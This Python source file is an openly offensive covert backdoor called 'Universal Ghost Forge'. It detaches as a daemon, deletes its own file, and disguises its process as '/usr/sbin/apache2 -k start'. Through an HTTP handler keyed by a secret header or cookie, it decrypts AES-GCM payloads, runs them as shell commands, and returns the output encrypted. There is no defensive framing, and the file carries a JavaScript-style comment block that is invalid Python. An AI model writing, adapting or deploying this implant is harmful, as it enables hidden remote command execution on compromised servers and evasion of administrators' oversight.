import os
import sys
import subprocess
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

/**
 * Universal Ghost Forge v6.1 - Zero-Knowledge Hardened Python Agent
 * Identity: ZK_SHADOW_DAEMON
 */

def daemonize():
    """Double fork to achieve 100% detachment."""
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
    except OSError: sys.exit(1)
    os.setsid()
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
    except OSError: sys.exit(1)
    sys.stdout.flush()
    sys.stderr.flush()
    si = open(os.devnull, 'r')
    so = open(os.devnull, 'a+')
    se = open(os.devnull, 'a+')
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

# 1. DETACH & SELF-DESTRUCT
daemonize()
try:
    os.remove(__file__)
except:
    pass

SALT = bytes.fromhex("__SALT_KEY__")
HN = "__HEADER_NAME__"
CN = "__COOKIE_NAME__"

# This would be integrated into a handler that receives req object
def handle_request(req_headers, post_data):
    try:
        # 2. ZERO-KNOWLEDGE KDF
        trigger = req_headers.get(HN) or req_headers.get('Cookie', '').split(CN+'=')[-1].split(';')[0]
        if not trigger: return None

        # Derive key from runtime trigger + stored salt
        key = hashlib.sha256((trigger + SALT.hex()).encode()).digest()
        aesgcm = AESGCM(key)

        raw = base64.b64decode(post_data.get('d', ''))
        nonce = raw[:12]
        ciphertext = raw[12:]
        
        # 3. SILENT FAIL DECRYPTION
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        if plaintext:
            # 4. FILELESS EXECUTION
            res = subprocess.check_output(plaintext, shell=True, stderr=subprocess.STDOUT)
            
            # Response encryption
            out_nonce = os.urandom(12)
            out_cipher = aesgcm.encrypt(out_nonce, res, None)
            return base64.b64encode(out_nonce + out_cipher)
    except:
        pass
    return None

# 5. PROCESS MASQUERADING
try:
    import setproctitle
    setproctitle.setproctitle("/usr/sbin/apache2 -k start")
except:
    pass
